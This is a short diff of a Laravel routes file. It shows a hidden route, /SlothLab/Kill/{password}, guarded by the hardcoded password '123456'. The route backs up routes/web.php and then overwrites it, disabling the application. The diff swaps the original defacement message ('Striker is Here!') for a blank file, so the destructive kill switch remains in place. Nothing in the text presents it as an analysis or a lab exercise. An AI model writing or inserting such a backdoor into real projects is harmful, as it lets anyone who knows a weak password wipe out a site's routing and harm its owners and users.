@@ -3,12 +3,7 @@
 Route::get('/SlothLab/Kill/{password}', function($password) {
     if($password == "123456") {
         copy(base_path("routes/web.php"), base_path("routes/sloth.php"));
-        $content = "
-<?php
-    Route::get('/', function () {
-        return 'Striker is Here!';
-});
-            ";
+        $content = " ";
         if(file_put_contents(base_path('routes/web.php'), $content)) {
             return "Killed the project successfully";
         }
